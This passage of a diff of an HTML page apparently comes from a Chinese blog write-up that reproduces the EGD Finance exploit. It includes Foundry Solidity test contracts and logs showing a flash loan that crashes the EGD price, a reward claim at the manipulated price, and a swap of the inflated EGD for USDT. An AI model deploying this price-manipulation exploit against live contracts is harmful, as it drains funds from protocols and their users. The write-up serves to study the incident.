-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">            <span class="mi">9</span><span class="n">_999_999_925</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
@@ -503,15 +526,14 @@
 </span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">            <span class="p">((</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_500_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">);</span> <span class="c1">//归还本金 + 5%手续费
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>输出:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -537,14 +559,16 @@
 </span></span><span class="line"><span class="cl">Logs:
 </span></span><span class="line"><span class="cl">  edg price before: 8093644493314726
 </span></span><span class="line"><span class="cl">  edg price after (i borrowed huge USDT out): 60702333
-</span></span><span class="line"><span class="cl">  edg price after (i return the borrowed USDT back): 8498326714945346
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">  edg price after (i return the borrowed USDT back): 8498326714945346</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>可以看到在我借出大量USDT后 和 归还借出的USDT前, EDG的价格由 8093644493314726 变成了 60702333,</p>
 <p>归还USDT后价格又恢复了.</p>
-<h3 id="质押usdt获取egd奖励">质押USDT获取EGD奖励</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<h3 class="heading-element" id="质押usdt获取egd奖励"><span>质押USDT获取EGD奖励</span>
+  <a href="#%e8%b4%a8%e6%8a%bcusdt%e8%8e%b7%e5%8f%96egd%e5%a5%96%e5%8a%b1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -634,7 +658,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">0</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
@@ -697,11 +721,11 @@
 </span></span></span><span class="line"><span class="cl"><span class="cm">        用它当推荐人就可以了。注意， topic1中的地址需要用工具toChecksumAddress转换一下，比如https://web3-tools.netlify.app
 </span></span></span><span class="line"><span class="cl"><span class="cm">         */</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//填写推荐人
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">bond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x85cbfaBD709c744C84A36BA47145396d724EE751</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">bond</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="mh">0x85cbfaBD709c744C84A36BA47145396d724EE751</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//批准egd_finance操作我们的usdt
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">egd_finance</span><span class="p">),</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">egd_finance</span><span class="p">),</span> <span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="c1">//质押
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">stake</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">stake</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="kt">uint256</span> <span class="n">totalAmount</span><span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">,</span> <span class="p">)</span> <span class="o">=</span> <span class="n">egd_finance</span><span class="p">.</span><span class="n">userInfo</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span><span class="s">&#34;usdt i staked:&#34;</span><span class="p">,</span> <span class="n">totalAmount</span><span class="p">);</span>
@@ -709,21 +733,20 @@
 </span></span><span class="line"><span class="cl">        <span class="n">assertEq</span><span class="p">(</span><span class="mi">100</span> <span class="kc">ether</span><span class="p">,</span> <span class="n">totalAmount</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//领取奖励
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="s">&#34;edg i get from the stake reward (2 days later):&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">            <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">))</span>
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>输出</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -749,13 +772,15 @@
 </span></span><span class="line"><span class="cl">Logs:
 </span></span><span class="line"><span class="cl">  usdt i staked: 100000000000000000000
 </span></span><span class="line"><span class="cl">  edg i have: 0
-</span></span><span class="line"><span class="cl">  edg i get from the stake reward (2 days later): 135123268981974350000
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">  edg i get from the stake reward (2 days later): 135123268981974350000</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>可以看到, 在正常情况下 质押 100个USDT, 2天后大约能获取135个EDG</p>
-<h3 id="在操纵价格后获取egd奖励">在操纵价格后获取EGD奖励</h3>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<h3 class="heading-element" id="在操纵价格后获取egd奖励"><span>在操纵价格后获取EGD奖励</span>
+  <a href="#%e5%9c%a8%e6%93%8d%e7%ba%b5%e4%bb%b7%e6%a0%bc%e5%90%8e%e8%8e%b7%e5%8f%96egd%e5%a5%96%e5%8a%b1" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="3" style="--fi-max-shown-lines:10;--fi-line-digit:3;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
@@ -870,7 +895,7 @@
 </span></code></pre></td>
 <td class="lntd">
 <pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: MIT
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">10</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;forge-std/test.sol&#34;</span><span class="p">;</span>
@@ -925,7 +950,7 @@
 </span></span><span class="line"><span class="cl">        <span class="n">stake</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//模拟2天后
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">vm</span><span class="p">.</span><span class="n">warp</span><span class="p">(</span><span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span> <span class="o">+</span> <span class="p">(</span><span class="mi">2</span> <span class="o">*</span> <span class="mi">24</span> <span class="o">*</span> <span class="mi">60</span> <span class="o">*</span> <span class="mi">60</span><span class="p">));</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="n">console2</span><span class="p">.</span><span class="n">log</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="s">&#34;all edg in EGD_Finance:&#34;</span><span class="p">,</span>
@@ -940,7 +965,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//贷款（价格操纵）
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">borrowUSDT</span> <span class="o">=</span> <span class="p">(</span><span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="n">balanceOf</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">))</span> <span class="o">*</span>
 </span></span><span class="line"><span class="cl">            <span class="mi">99997600</span><span class="p">)</span> <span class="o">/</span> <span class="mi">100000000</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">EGD_USDT_LPPool</span><span class="p">.</span><span class="n">swap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">borrowUSDT</span><span class="p">,</span> <span class="kt">address</span><span class="p">(</span><span class="nb">this</span><span class="p">),</span> <span class="s">&#34;abcd&#34;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
@@ -952,7 +977,7 @@
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">    <span class="c1">//贷款的回调函数
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
+</span></span></span><span class="line"><span class="cl">    <span class="kd">function</span> <span class="nf">pancakeCall</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint256</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="kt">uint256</span> <span class="n">count1</span><span class="p">,</span>
@@ -964,10 +989,10 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//在价格不合理的时候领取质押奖励
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
+</span></span></span><span class="line"><span class="cl">        <span class="n">egd_finance</span><span class="p">.</span><span class="n">claimAllReward</span><span class="p">();</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//归还贷款本金 + 5%手续费
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">bool</span> <span class="n">success</span> <span class="o">=</span> <span class="n">IERC20</span><span class="p">(</span><span class="n">usdt</span><span class="p">).</span><span class="nb">transfer</span><span class="p">(</span>
 </span></span><span class="line"><span class="cl">            <span class="kt">address</span><span class="p">(</span><span class="n">EGD_USDT_LPPool</span><span class="p">),</span>
 </span></span><span class="line"><span class="cl">            <span class="p">((</span><span class="n">count1</span> <span class="o">*</span> <span class="mi">10</span><span class="n">_500_000_000</span><span class="p">)</span> <span class="o">/</span> <span class="mi">10</span><span class="n">_000_000_000</span><span class="p">)</span>
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
@@ -979,12 +1004,11 @@
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="nb">require</span><span class="p">(</span><span class="n">success</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>输出:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-fallback"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -1014,14 +1038,16 @@
 </span></span><span class="line"><span class="cl">  edg price before: 8096310933284567
 </span></span><span class="line"><span class="cl">  egd i should reward by noraml case: 1093999999999910400
 </span></span><span class="line"><span class="cl">  edg price after (i borrowed huge USDT out): 194311462398
-</span></span><span class="line"><span class="cl">  edg i get from the stake reward: 5630136207606302655330000
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl">  edg i get from the stake reward: 5630136207606302655330000</span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>可以看到, 我们本来只能领取EDG:  1093999999999910400  变成了  5630136207606302655330000, 放大了500万倍.</p>
-<h3 id="将获利兑换为usdt进行套现">将获利兑换为USDT进行套现</h3>
-<p>我这里为了让逻辑更清晰, 新建一个合约专门用于USDT兑换:</p>
-<div class="highlight"><div class="chroma">
-<table class="lntable"><tr><td class="lntd">
+<h3 class="heading-element" id="将获利兑换为usdt进行套现"><span>将获利兑换为USDT进行套现</span>
+  <a href="#%e5%b0%86%e8%8e%b7%e5%88%a9%e5%85%91%e6%8d%a2%e4%b8%bausdt%e8%bf%9b%e8%a1%8c%e5%a5%97%e7%8e%b0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>我这里为了让逻辑更清晰, 新建一个合约专门用于USDT兑换:</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-solidity"><span class="code-title"><i class="arrow fa-solid fa-chevron-down" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="切换行号" role="button" title="切换行号"><i class="fa-solid fa-list-ol" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="切换自动换行" role="button" title="切换自动换行"><i class="fa-solid fa-right-left" aria-hidden="true"></i></span><span class="copy-btn" aria-label="复制到剪贴板" role="button" title="复制到剪贴板"><i class="fa-regular fa-clone" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
@@ -1055,7 +1081,7 @@
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">        <span class="c1">//将egd兑换成usdt
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
+</span></span></span><span class="line"><span class="cl">        <span class="kt">address</span><span class="p">[]</span> <span class="k">memory</span> <span class="n">path</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">address</span><span class="p">[](</span><span class="mi">2</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">egd</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">path</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">usdt</span><span class="p">;</span>
 </span></span><span class="line"><span class="cl">        <span class="n">IERC20</span><span class="p">(</span><span class="n">egd</span><span class="p">).</span><span class="n">approve</span><span class="p">(</span><span class="kt">address</span><span class="p">(</span><span class="n">pancakeRouter</span><span class="p">),</span> <span class="nb">type</span><span class="p">(</span><span class="nc">uint256</span><span class="p">).</span><span class="nb">max</span><span class="p">);</span>
@@ -1067,11 +1093,10 @@
 </span></span><span class="line"><span class="cl">            <span class="nb">block</span><span class="p">.</span><span class="nb">timestamp</span>
 </span></span><span class="line"><span class="cl">        <span class="p">);</span>
 </span></span><span class="line"><span class="cl">    <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></td></tr></table>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="展开或折叠代码块" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
 </div>
 </div><p>其中</p>
